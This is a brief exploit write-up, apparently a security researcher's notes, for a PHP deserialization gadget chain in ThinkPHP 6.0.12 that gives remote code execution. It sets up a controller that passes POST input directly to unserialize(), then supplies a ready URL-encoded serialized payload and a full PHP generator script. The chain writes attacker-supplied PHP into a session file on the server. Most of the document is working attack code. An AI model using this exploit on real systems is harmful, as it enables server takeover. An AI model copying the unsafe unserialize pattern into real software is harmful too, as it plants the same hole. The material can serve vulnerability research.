# ThinkPHP RCE链子

**Environment installation**
test version:Thinkphp6.0.12

Environment configuration：(tp6只支持用composer安装)
	composer create-project topthink/think=6.0.12 tp612
	
Add deserialization entry point


```php
<?php

namespace app\controller;

  

use app\BaseController;

use think\facade\Request;

class Index extends BaseController

{

    public function index()

    {

        $payload=Request::post('cmd');

        unserialize($payload);

    }

  

    public function hello($name = 'ThinkPHP6')

    {

        return 'hello,' . $name;

    }

}
```

```
direct interview
http://127.0.0.1 
post to send package
```

```php
cmd=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A15%3A%22think%5Croute%5CUrl%22%3A4%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A2%3A%22a%3A%22%3Bs%3A9%3A%22%00%2A%00domain%22%3Bs%3A27%3A%22%3C%3Fphp+phpinfo%28%29%3B+exit%28%29%3B+%3F%3E%22%3Bs%3A6%3A%22%00%2A%00app%22%3BO%3A16%3A%22think%5CMiddleware%22%3A1%3A%7Bs%3A7%3A%22request%22%3Bi%3A2333%3B%7Ds%3A8%3A%22%00%2A%00route%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A13%3A%22getDomainBind%22%3B%7Ds%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A21%3A%22League%5CFlysystem%5CFile%22%3A2%3A%7Bs%3A7%3A%22%00%2A%00path%22%3Bs%3A10%3A%22huahua.php%22%3Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A25%3A%22think%5Csession%5Cdriver%5CFile%22%3A0%3A%7B%7D%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22huahua%22%3B%7D%7D
```

access`sess_huahua.php`
successfully RCE
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/20220524114105.png)

exp

```php
<?php  
namespace think\model\concern{  
    trait Attribute{  
        private $data = ['huahua']; 
    }  
}  
  
namespace think\view\driver{  
    class Php{}  
}
namespace think\session\driver{
    class File{

    }
}
namespace League\Flysystem{
    class File{
        protected $path;
        protected $filesystem;
        public function __construct($File){
            $this->path='huahua.php';
            $this->filesystem=$File;
        }
    }
}
namespace think\console{
    use League\Flysystem\File;
    class Output{
        protected $styles=[];
        private $handle;
        public function __construct($File){
            $this->styles[]='getDomainBind';
            $this->handle=new File($File);
        }
    }
}  
namespace think{  
    abstract class Model{  
        use model\concern\Attribute;  
        private $lazySave;  
        protected $withEvent;  
        protected $table;  
        function __construct($cmd,$File){  
            $this->lazySave = true;  
            $this->withEvent = false;  
            $this->table = new route\Url(new Middleware,new console\Output($File),$cmd);  
        }  
    }  
    class Middleware{  
        public $request = 2333;  
    }   
}  
  
namespace think\model{  
    use think\Model;  
    class Pivot extends Model{}   
}  
  
namespace think\route{  
    class Url  
    {  
        protected $url = 'a:';  
        protected $domain;  
        protected $app;  
        protected $route;  
        function __construct($app,$route,$cmd){  
            $this->domain = $cmd;  
            $this->app = $app;  
            $this->route = $route;  
        }  
    }  
}  
  
namespace{  
    echo urlencode(serialize(new think\Model\Pivot('<?php phpinfo(); exit(); ?>',new think\session\driver\File)));  
}
```
